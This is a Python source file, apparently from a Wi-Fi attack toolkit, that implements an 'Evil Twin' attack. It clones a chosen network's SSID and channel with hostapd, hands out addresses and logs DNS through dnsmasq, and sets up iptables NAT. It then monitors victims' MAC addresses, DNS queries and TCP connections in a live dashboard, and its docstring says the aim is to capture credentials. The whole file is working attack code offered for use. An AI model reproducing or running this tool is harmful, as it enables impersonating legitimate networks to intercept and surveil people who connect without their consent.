
import shutil
import time
from scapy.all import *
from rich.console import Group
from rich.table import Table
from rich.prompt import Prompt
from rich.panel import Panel
from rich.live import Live
from datetime import datetime
import subprocess
import json
from pathlib import Path
import shutil
import tempfile

timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
log_dir = Path("logs") / timestamp


def evil_twin_attack(self):
    """Creates an Evil Twin access point to capture credentials"""
    # Store original network settings
    original_settings = {}
    original_interface_name = self.interface_name  # Store original interface name
    
    # Clear any existing client data and cache
    try:
        # Clear dnsmasq leases file
        subprocess.run(["rm", "-f", "/var/lib/misc/dnsmasq.leases"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Create empty dnsmasq.leases file and set permissions
        try:
            with open("/var/lib/misc/dnsmasq.leases", 'w') as f:
                pass  # Create empty file
            # Set proper permissions
            subprocess.run(["chmod", "644", "/var/lib/misc/dnsmasq.leases"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # Ensure dnsmasq can access the file
            dnsmasq_dir = Path("/var/lib/misc")
            if not dnsmasq_dir.exists():
                dnsmasq_dir.mkdir(parents=True, exist_ok=True)
                subprocess.run(["chmod", "755", str(dnsmasq_dir)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            self.logger.log_evil_twin(f"Warning: Could not create dnsmasq.leases file: {str(e)}")
        # Clear any existing evil twin logs
        evil_twin_dir = self.logger.log_dir / "evil_twin"
        if evil_twin_dir.exists():
            for file in evil_twin_dir.glob("*"):
                try:
                    file.unlink()
                except:
                    pass
    except Exception as e:
        self.logger.log_evil_twin(f"Warning: Could not clear previous cache: {str(e)}")

    try:
        # Get original network settings
        self.console.print("[bold blue]Saving original network settings...[/]")
        original_settings['ip_forward'] = subprocess.check_output(["cat", "/proc/sys/net/ipv4/ip_forward"]).decode().strip()
        original_settings['interface_state'] = subprocess.check_output(["ip", "addr", "show", self.interface_name]).decode()
        original_settings['route_table'] = subprocess.check_output(["ip", "route", "show"]).decode()
        original_settings['iptables'] = subprocess.check_output(["iptables-save"]).decode()
        original_settings['resolved_status'] = subprocess.run(["systemctl", "is-active", "systemd-resolved"], 
                                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
        original_settings['network_manager_status'] = subprocess.run(["systemctl", "is-active", "NetworkManager"], 
                                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
        original_settings['wpa_supplicant_status'] = subprocess.run(["systemctl", "is-active", "wpa_supplicant"], 
                                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
        
        # Save WiFi connection info if available
        try:
            original_settings['wifi_connections'] = subprocess.check_output(["nmcli", "-t", "-f", "NAME,UUID,TYPE", "connection", "show"]).decode()
        except:
            original_settings['wifi_connections'] = ""

        # Get network info
        default_ssid = ""
        default_channel = "1"
        if self.selected_network:
            network = self.networks[self.selected_network]
            default_ssid = network['ssid']
            default_channel = str(network['channel'])
            self.console.print(f"\n[bold yellow]Selected network: {default_ssid} (Channel: {default_channel})[/]")
        
        
        # Ask for SSID (with default if network is selected)
        ssid = Prompt.ask("Enter SSID for the Evil Twin", default=default_ssid)
        if not ssid and default_ssid:
            ssid = default_ssid
            self.console.print(f"[bold cyan]Using selected network SSID: {ssid}[/]")
        
        # Ask for channel (with default if network is selected)
        channel_input = Prompt.ask("Enter channel (1-11)", default=default_channel)
        try:
            channel = int(channel_input)
            if channel < 1 or channel > 11:
                self.console.print("[bold yellow]Invalid channel, using default channel 1[/]")
                channel = 1
        except:
            self.console.print("[bold yellow]Invalid channel, using default channel 1[/]")
            channel = 1
    
        # Ask for WPA2-PSK configuration
        use_wpa2 = Prompt.ask("Enable WPA2-PSK security? (y/n)", choices=["y", "n"]) == "y"
        if use_wpa2:
            wpa_passphrase = Prompt.ask("Enter WPA2 passphrase (8-63 characters)")
            if len(wpa_passphrase) < 8 or len(wpa_passphrase) > 63:
                self.console.print("[bold red]Invalid passphrase length! Using default: 12345678[/]")
                wpa_passphrase = "12345678"
    
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Log Evil Twin attack start
        self.logger.log_evil_twin("Attack started", ssid=ssid, channel=channel, security="WPA2" if use_wpa2 else "Open")
        
        # Create necessary directories
        log_dir = self.logger.log_dir / "evil_twin"
        log_dir.mkdir(exist_ok=True)
        
        # Create hostapd configuration
        hostapd_conf = f"""interface={self.interface_name}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wmm_enabled=1
ieee80211n=1
ht_capab=[HT40+][SHORT-GI-40][DSSS_CCK-40]"""

        if use_wpa2:
            hostapd_conf += f"""
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase={wpa_passphrase}
wpa_pairwise=CCMP
rsn_pairwise=CCMP"""

        # Create dnsmasq configuration
        dnsmasq_conf = f"""interface={self.interface_name}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
log-queries
log-dhcp
log-facility={log_dir}/dnsmasq.log
log-async=20
listen-address=192.168.1.1
bind-interfaces
no-resolv
server=8.8.8.8
server=8.8.4.4
dhcp-leasefile={log_dir}/dnsmasq.leases"""

        # Stop network services
        self.console.print("[bold blue]Preparing network environment...[/]")
        self.logger.log_evil_twin("Stopping network services")
        subprocess.run(["systemctl", "stop", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["systemctl", "stop", "wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["killall", "dnsmasq"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["killall", "hostapd"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

        # Configure interface
        self.console.print("[bold blue]Configuring network interface...[/]")
        self.logger.log_evil_twin("Configuring network interface")
        subprocess.run(["rfkill", "unblock", "all"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", self.interface_name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "addr", "flush", "dev", self.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", self.interface_name, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "addr", "add", "192.168.1.1/24", "dev", self.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

        # Write configurations
        hostapd_path = log_dir / "hostapd.conf"
        dnsmasq_path = log_dir / "dnsmasq.conf"
        
        with open(hostapd_path, "w") as f:
            f.write(hostapd_conf)
        with open(dnsmasq_path, "w") as f:
            f.write(dnsmasq_conf)

        # Start Evil Twin AP
        self.console.print("[bold blue]Starting Evil Twin access point...[/]")
        self.logger.log_evil_twin("Starting access point")
        hostapd_proc = subprocess.Popen(["hostapd", str(hostapd_path)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(3)
        
        # Check if hostapd started successfully
        if hostapd_proc.poll() is not None:
            self.logger.log_evil_twin("Failed to start hostapd", error=True)
            raise Exception("Failed to start hostapd. Check your wireless adapter.")
        
        # Start DHCP server
        self.logger.log_evil_twin("Starting DHCP server")
        dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", str(dnsmasq_path), "-d"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(2)
        
        if dnsmasq_proc.poll() is not None:
            self.logger.log_evil_twin("Failed to start dnsmasq", error=True)
            raise Exception("Failed to start dnsmasq. Check configuration.")

        # Enable IP forwarding
        subprocess.run(["sysctl", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Configure iptables
        self.logger.log_evil_twin("Configuring iptables")
        subprocess.run(["iptables", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iptables", "-t", "nat", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", self.interface_name, "-j", "MASQUERADE"], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iptables", "-A", "FORWARD", "-i", self.interface_name, "-j", "ACCEPT"], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        dnsmasq_log = log_dir / "dnsmasq.log"
        if not dnsmasq_log.exists():
            dnsmasq_log.touch()

        with Live(refresh_per_second=4) as live:
            start_time = time.time()
            clients_connected = {}  # Reset clients dictionary
            dns_queries = []
            tcp_connections = []
            
            # Create cache directory for this session
            cache_dir = Path("/tmp/wifiangel_evil_twin")
            cache_dir.mkdir(exist_ok=True)
            session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
            session_file = cache_dir / f"clients_{session_id}.json"
            
            # Clear any existing dnsmasq leases
            leases_file = log_dir / "dnsmasq.leases"
            
            # Create empty dnsmasq.leases file and set permissions
            try:
                # Ensure file exists
                leases_file.touch(exist_ok=True)
                # Set proper permissions
                subprocess.run(["chmod", "644", str(leases_file)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception as e:
                self.logger.log_evil_twin(f"Warning: Could not create dnsmasq.leases file: {str(e)}")

            while True:
                # Create main status table
                status_table = Table(show_header=True, header_style="bold magenta", title="[bold blue]Evil Twin Status[/]")
                status_table.add_column("Evil Twin SSID", style="cyan")
                status_table.add_column("Channel", style="green")
                status_table.add_column("Security", style="yellow")
                status_table.add_column("AP Status", style="magenta")
                status_table.add_column("Running Time", style="cyan")
                
                elapsed = int(time.time() - start_time)
                time_str = f"{elapsed//3600:02d}:{(elapsed%3600)//60:02d}:{elapsed%60:02d}"
                
                security_str = f"WPA2-PSK ({wpa_passphrase})" if use_wpa2 else "Open"
                
                # Check AP status
                ap_status = "[bold green]Active"
                if hostapd_proc.poll() is not None or dnsmasq_proc.poll() is not None:
                    ap_status = "[bold red]Error"
                    self.logger.log_evil_twin("Service crashed, attempting restart")
                    # Try to restart services if they've crashed
                    if hostapd_proc.poll() is not None:
                        hostapd_proc = subprocess.Popen(["hostapd", str(hostapd_path)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    if dnsmasq_proc.poll() is not None:
                        dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", str(dnsmasq_path), "-d"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                status_table.add_row(ssid, str(channel), security_str, ap_status, time_str)

                # Get current TCP connections (only for Evil Twin network)
                if int(time.time()) % 10 == 0:  # Update every 10 seconds
                    try:
                        netstat = subprocess.check_output(["netstat", "-tn"], universal_newlines=True).split("\n")[2:]
                        tcp_connections = []
                        for line in netstat:
                            if "192.168.1." in line:  # Only show connections from Evil Twin network
                                conn_parts = line.split()
                                tcp_connections.append(conn_parts)
                                # Log TCP connection
                                if len(conn_parts) >= 6:
                                    self.logger.log_traffic(
                                        src=conn_parts[3],
                                        dst=conn_parts[4],
                                        bytes_count="N/A",
                                        protocol="TCP"
                                    )
                    except:
                        tcp_connections = []

                # Create TCP connections table
                tcp_table = Table(show_header=True, header_style="bold blue", title="[bold blue]Active TCP ESTABLISHED Connections[/] (Updates every 10s)")
                tcp_table.add_column("Local Address", style="cyan")
                tcp_table.add_column("Remote Address", style="green")
                tcp_table.add_column("State", style="yellow")
                
                for conn in tcp_connections[-10:]:  # Show last 10 connections
                    if len(conn) >= 6 and conn[5] == "ESTABLISHED" and "192.168.1." in conn[3]:
                        tcp_table.add_row(conn[3], conn[4], conn[5])

                # Create DNS queries table
                dns_table = Table(show_header=True, header_style="bold green", title="[bold blue]Recent DNS Queries[/]")
                dns_table.add_column("Time", style="cyan")
                dns_table.add_column("Client IP", style="green")
                dns_table.add_column("Query", style="yellow")
                dns_table.add_column("Type", style="magenta")

                # Read DNS queries from dnsmasq log (only for Evil Twin network)
                if dnsmasq_log.exists():
                    with open(dnsmasq_log, "r") as f:
                        log_content = f.readlines()
                        for line in log_content[-20:]:  # Show last 20 DNS queries
                            if "query" in line and "192.168.1." in line:  # Only show queries from Evil Twin network
                                try:
                                    parts = line.split()
                                    time_str = " ".join(parts[0:3])
                                    client_ip = parts[parts.index("from") + 1]
                                    query = parts[parts.index("query") + 1]
                                    query_type = parts[-1]
                                    dns_table.add_row(time_str, client_ip, query, query_type)
                                    # Log DNS query
                                    self.logger.log_dns_query(client_ip, query, query_type)
                                except:
                                    continue

                # Create clients table
                clients_table = Table(show_header=True, header_style="bold yellow", title="[bold blue]Connected Clients[/]")
                clients_table.add_column("MAC Address", style="cyan")
                clients_table.add_column("IP Address", style="green")
                clients_table.add_column("Connected Since", style="yellow")
                clients_table.add_column("Data Transferred", style="magenta")

                # Update connected clients from dnsmasq leases
                try:
                    leases_file = log_dir / "dnsmasq.leases"
                    if leases_file.exists():
                        with open(leases_file, "r") as f:
                            leases = f.readlines()
                            current_clients = {}  # Temporary dictionary for current clients
                            for lease in leases:
                                parts = lease.split()
                                if len(parts) >= 5:
                                    mac = parts[1]
                                    ip = parts[2]
                                    hostname = parts[3]
                                    if ip.startswith("192.168.1."):  # Only show clients from Evil Twin network
                                        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                        current_clients[mac] = {
                                            'ip': ip,
                                            'hostname': hostname,
                                            'connected_since': current_time
                                        }
                                        if mac not in clients_connected:
                                            # Log new client connection
                                            self.logger.log_evil_twin(f"New client connected: {mac} ({ip})")
                                            
                            # Update clients_connected with current clients only
                            clients_connected = current_clients
                            
                            # Save current clients to session file
                            try:
                                with open(session_file, 'w') as f:
                                    json.dump(clients_connected, f)
                            except:
                                pass
                except:
                    pass

                for mac, details in clients_connected.items():
                    # Get data transferred
                    try:
                        data = subprocess.check_output(["iptables", "-L", "FORWARD", "-v", "-n", "-x"]).decode()
                        for line in data.split("\n"):
                            if details['ip'] in line:
                                bytes_str = line.split()[1]
                                data_transferred = f"{int(bytes_str)/1024:.2f} KB"
                                # Log traffic data
                                self.logger.log_traffic(
                                    src=details['ip'],
                                    dst="*",
                                    bytes_count=bytes_str,
                                    protocol="ALL"
                                )
                                break
                        else:
                            data_transferred = "0 KB"
                    except:
                        data_transferred = "N/A"

                    clients_table.add_row(
                        mac,
                        details['ip'],
                        details['connected_since'],
                        data_transferred
                    )

                # Update display with all tables
                live.update(Group(
                    status_table,
                    Panel(clients_table, title="Connected Clients"),
                    Panel(dns_table, title="Recent DNS Queries"),
                    Panel(tcp_table, title="TCP Connections")
                ))

                time.sleep(1)

    except KeyboardInterrupt:
        self.logger.log_evil_twin("Attack stopped by user")
        self.console.print("\n[bold yellow]Evil Twin attack stopped by user.[/]")
    except Exception as e:
        self.logger.log_evil_twin(f"Error during attack: {str(e)}", error=True)
        self.console.print(f"\n[bold red]Error during Evil Twin attack: {str(e)}[/]")
    finally:
        # Cleanup and restore original settings
        self.cleanup_evil_twin(original_settings)
        self.current_menu = "attack"



def cleanup_evil_twin(self, original_settings):
    """Cleanup Evil Twin attack resources"""
    self.console.print("[bold blue]Cleaning up and restoring network settings...[/]")
    self.logger.log_evil_twin("Starting cleanup process")
    
    try:
        # Clear cache and temporary files
        cache_dir = Path("/tmp/wifiangel_evil_twin")
        if cache_dir.exists():
            try:
                shutil.rmtree(cache_dir)
            except:
                pass
        
        # Clear dnsmasq leases
        try:
            leases_file = log_dir / "dnsmasq.leases"
            if leases_file.exists():
                # Just empty the file instead of removing it
                with open(leases_file, 'w') as f:
                    pass  # Create empty file
                # Set proper permissions
                subprocess.run(["chmod", "644", str(leases_file)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

        # Kill all related processes
        self.logger.log_evil_twin("Stopping all related processes")
        processes_to_kill = ["hostapd", "dnsmasq", "dhcpd", "wpa_supplicant"]
        for proc in processes_to_kill:
            subprocess.run(["killall", "-9", proc], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Reset IP forwarding
        if 'ip_forward' in original_settings:
            self.logger.log_evil_twin("Resetting IP forwarding")
            subprocess.run(["sysctl", f"net.ipv4.ip_forward={original_settings['ip_forward']}"], 
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Reset iptables
        self.logger.log_evil_twin("Resetting iptables")
        subprocess.run(["iptables", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iptables", "-t", "nat", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iptables", "-t", "mangle", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iptables", "-X"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Restore saved iptables rules
        if 'iptables' in original_settings:
            try:
                with tempfile.NamedTemporaryFile(mode='w+') as f:
                    f.write(original_settings['iptables'])
                    f.flush()
                    subprocess.run(["iptables-restore", f.name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                self.logger.log_evil_twin("Failed to restore iptables configuration", error=True)
        
        # Stop monitor mode and switch back to managed mode
        if 'mon' in self.interface_name:
            try:
                subprocess.run(["airmon-ng", "stop", self.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.interface_name = self.interface_name.replace('mon', '')
            except:
                self.logger.log_evil_twin("Failed to stop monitor mode using airmon-ng", error=True)
        
        # Ensure interface is in managed mode
        subprocess.run(["ip", "link", "set", self.interface_name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iw", self.interface_name, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", self.interface_name, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Restart network services in correct order
        if 'resolved_status' in original_settings and original_settings['resolved_status'] == 'active':
            subprocess.run(["systemctl", "restart", "systemd-resolved"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if 'wpa_supplicant_status' in original_settings and original_settings['wpa_supplicant_status'] == 'active':
            subprocess.run(["systemctl", "restart", "wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if 'network_manager_status' in original_settings and original_settings['network_manager_status'] == 'active':
            subprocess.run(["systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        self.console.print("[bold green]✓ Network settings restored successfully.[/]")
        self.console.print("[bold green]✓ Interface switched back to managed mode.[/]")
        self.console.print("[bold yellow]ℹ️ You can now manually connect to your WiFi network.[/]")
        
    except Exception as e:
        self.logger.log_evil_twin(f"Error during cleanup: {str(e)}", error=True)
        self.console.print(f"[bold red]Error during cleanup: {str(e)}[/]")
        
    finally:
        # Final verification of network service status
        self.verify_network_services()